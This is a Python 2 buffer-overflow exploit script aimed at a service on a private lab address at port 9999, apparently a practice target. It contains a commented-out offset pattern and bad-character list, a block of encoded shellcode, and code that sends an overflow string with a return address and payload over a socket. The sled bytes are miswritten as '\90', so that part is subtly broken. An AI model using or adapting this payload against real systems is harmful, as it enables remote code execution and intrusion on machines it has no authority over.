# !/usr/bin/python
import socket

#string = "Aa0Aia1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

#badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
buf =  ""
buf += "\xbb\x2b\x18\x1b\xfa\xdb\xcc\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x52\x83\xc6\x04\x31\x5e\x0e\x03\x75\x16\xf9"
buf += "\x0f\x75\xce\x7f\xef\x85\x0f\xe0\x79\x60\x3e\x20\x1d"
buf += "\xe1\x11\x90\x55\xa7\x9d\x5b\x3b\x53\x15\x29\x94\x54"
buf += "\x9e\x84\xc2\x5b\x1f\xb4\x37\xfa\xa3\xc7\x6b\xdc\x9a"
buf += "\x07\x7e\x1d\xda\x7a\x73\x4f\xb3\xf1\x26\x7f\xb0\x4c"
buf += "\xfb\xf4\x8a\x41\x7b\xe9\x5b\x63\xaa\xbc\xd0\x3a\x6c"
buf += "\x3f\x34\x37\x25\x27\x59\x72\xff\xdc\xa9\x08\xfe\x34"
buf += "\xe0\xf1\xad\x79\xcc\x03\xaf\xbe\xeb\xfb\xda\xb6\x0f"
buf += "\x81\xdc\x0d\x6d\x5d\x68\x95\xd5\x16\xca\x71\xe7\xfb"
buf += "\x8d\xf2\xeb\xb0\xda\x5c\xe8\x47\x0e\xd7\x14\xc3\xb1"
buf += "\x37\x9d\x97\x95\x93\xc5\x4c\xb7\x82\xa3\x23\xc8\xd4"
buf += "\x0b\x9b\x6c\x9f\xa6\xc8\x1c\xc2\xae\x3d\x2d\xfc\x2e"
buf += "\x2a\x26\x8f\x1c\xf5\x9c\x07\x2d\x7e\x3b\xd0\x52\x55"
buf += "\xfb\x4e\xad\x56\xfc\x47\x6a\x02\xac\xff\x5b\x2b\x27"
buf += "\xff\x64\xfe\xe8\xaf\xca\x51\x49\x1f\xab\x01\x21\x75"
buf += "\x24\x7d\x51\x76\xee\x16\xf8\x8d\x79\xd9\x55\x8e\xe1"
buf += "\xb1\xa7\x90\x15\x90\x21\x76\x7f\x04\x64\x21\xe8\xbd"
buf += "\x2d\xb9\x89\x42\xf8\xc4\x8a\xc9\x0f\x39\x44\x3a\x65"
buf += "\x29\x31\xca\x30\x13\x94\xd5\xee\x3b\x7a\x47\x75\xbb"
buf += "\xf5\x74\x22\xec\x52\x4a\x3b\x78\x4f\xf5\x95\x9e\x92"
buf += "\x63\xdd\x1a\x49\x50\xe0\xa3\x1c\xec\xc6\xb3\xd8\xed"
buf += "\x42\xe7\xb4\xbb\x1c\x51\x73\x12\xef\x0b\x2d\xc9\xb9"
buf += "\xdb\xa8\x21\x7a\x9d\xb4\x6f\x0c\x41\x04\xc6\x49\x7e"
buf += "\xa9\x8e\x5d\x07\xd7\x2e\xa1\xd2\x53\x5e\xe8\x7e\xf5"
buf += "\xf7\xb5\xeb\x47\x9a\x45\xc6\x84\xa3\xc5\xe2\x74\x50"
buf += "\xd5\x87\x71\x1c\x51\x74\x08\x0d\x34\x7a\xbf\x2e\x1d"


string = "A" * 524 + "\xf3\x12\x17\x31" +"\90" * 8 + buf  +  "C" * (1000 - 524 -4 - 8)

print "Fuzzing..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.3.150', 9999))
s.send(string)
data = s.recv(1024)
print len(data)
for line in data:
    if 'ACCESS' in line: 
        print line
    else:
        print 'still fuzzing...'
s.close()
